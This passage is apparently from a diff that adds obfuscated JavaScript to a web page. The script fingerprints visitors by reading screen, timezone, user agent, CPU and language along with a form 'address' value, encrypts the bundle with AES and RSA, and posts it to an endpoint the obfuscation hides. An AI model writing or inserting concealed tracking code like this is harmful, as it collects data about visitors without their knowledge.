(_0x3b5d3c, _0x35b705) { return _0x3b5d3c + _0x35b705; }, 'qPOkr': function (_0x174a3f, _0x2671f0) { return _0x174a3f(_0x2671f0); }, 'KjbCf': _0x5aa9('5', 'D0xt'), 'VYxjL': _0x5aa9('6', 'ndZO'), 'OYfIZ': _0x5aa9('7', 'U4EO') }; function _0x3eee36(_0x587c3f) { if (!_0x21b2d4[_0x5aa9('8', 'H(Ha')](parseInt, _0x587c3f, 0xa)) _0x587c3f = 0x6; var _0x88cf9b = Math['floor'](_0x21b2d4[_0x5aa9('9', 'L(7F')](Math[_0x5aa9('a', 'w@eh')](0x24, _0x587c3f), Math['random']()))[_0x5aa9('b', 'm#Gi')](0x24); return (Math[_0x5aa9('c', '1!LT')](0xa, _0x587c3f) + _0x88cf9b)[_0x5aa9('d', 'HVQX')](-_0x587c3f); } _0x21b2d4[_0x5aa9('e', '1!LT')]($, document)['on'](_0x21b2d4['VYxjL'], _0x21b2d4[_0x5aa9('f', 'D&9a')], function (_0x3e7c49) { var _0x5abfc2 = _0x21b2d4[_0x5aa9('10', 'G!Q$')][_0x5aa9('11', 'HSeN')]('|'), _0x2b1559 = 0x0; while (!![]) { switch (_0x5abfc2[_0x2b1559++]) { case '0': var _0x87afc2 = new JSEncrypt(); continue; case '1': var _0x1f2b4c = ''; continue; case '2': _0x15ea5a = _0x87afc2[_0x5aa9('12', 'R10E')](_0x15ea5a); continue; case '3': var _0x123288 = ['-----BEGIN\x20PUBLIC\x20KEY-----', _0x21b2d4[_0x5aa9('13', 'Skb0')], _0x5aa9('14', '7nWh'), _0x21b2d4[_0x5aa9('15', 'nnsP')], _0x5aa9('16', 'Skb0'), _0x5aa9('17', 'IRmf')]; continue; case '4': if (window[_0x5aa9('18', 'JFzE')] && window[_0x5aa9('19', 'MgiB')][_0x5aa9('1a', ')J[f')](_0x21b2d4['DtXvm'])) { _0x1f2b4c = window[_0x5aa9('1b', 'Aq11')][_0x5aa9('1c', 'W&Az')](0xa); } else if (window[_0x5aa9('1d', 'P]Qs')]) { window[_0x5aa9('1d', 'P]Qs')][_0x5aa9('1e', 'U4EO')](_0x21b2d4[_0x5aa9('1f', 'D0xt')]); } continue; case '5': var _0x5d2788 = ''; continue; case '6': var _0x2937c0 = ''; continue; case '7': var _0x15ea5a = _0x3eee36(0x24); continue; case '8': _0x38bc59[_0x5aa9('20', 'D0xt')](_0x5aa9('21', 'r]Ar'), { 'content': _0x3ef733, 'key': _0x15ea5a }, function () { _0x21b2d4[_0x5aa9('22', 'OiRc')](init_page, _0x38bc59); }); continue; case '9': _0x3e7c49['preventDefault'](); continue; case '10': _0x87afc2['setPublicKey'](_0x123288['join']('\x0a')); continue; case '11': try { _0x2937c0 = _0x21b2d4[_0x5aa9('23', 'eMoW')](parseInt, new Date()[_0x5aa9('24', '(igk')]() / -0x3c); } catch (_0x442dbc) { } continue; case '12': var _0x3ef733 = { 'address': _0x21b2d4[_0x5aa9('25', 'zUpr')]($, this)[_0x5aa9('26', 'B^X5')](_0x21b2d4[_0x5aa9('27', 'R10E')])[_0x5aa9('28', 'aIsq')](), 'ref': $(this)[_0x5aa9('26', 'B^X5')](_0x21b2d4['LzaVe'])[_0x5aa9('29', 'w@eh')](), 'uuid': _0x1f2b4c, 'tz': _0x5d2788, 'tz_offset': _0x2937c0, 'screen': _0x21b2d4[_0x5aa9('2a', 'JPNW')](_0x21b2d4[_0x5aa9('2b', 'zUpr')](_0x21b2d4[_0x5aa9('2c', 'pvSQ')](_0x21b2d4[_0x5aa9('2d', 'Skb0')](window[_0x5aa9('2e', '[Qw1')][_0x5aa9('2f', 'Niu5')], 'x'), window[_0x5aa9('30', 'r]Ar')][_0x5aa9('31', 'Niu5')]), 'x'), window[_0x5aa9('32', 'IRmf')][_0x5aa9('33', 'ndZO')]), 'user_agent': navigator[_0x5aa9('34', 'm#Gi')], 'cpu': navigator[_0x5aa9('35', 'H(Ha')], 'lang': navigator['language'] || navigator['userLanguage'] }; continue; case '13': var _0x38bc59 = _0x21b2d4[_0x5aa9('36', 'HSeN')]($, _0x21b2d4[_0x5aa9('37', 'iz]X')]); continue; case '14': try { _0x5d2788 = new Intl['DateTimeFormat']()[_0x5aa9('38', 'H(Ha')]()['timeZone']; } catch (_0x2465ab) { } continue; case '15': _0x3ef733 = AES256['encrypt'](JSON[_0x5aa9('39', ')J[f')](_0x3ef733), _0x15ea5a); continue; }break; } }); }());
+</script>
+
+</body></html>
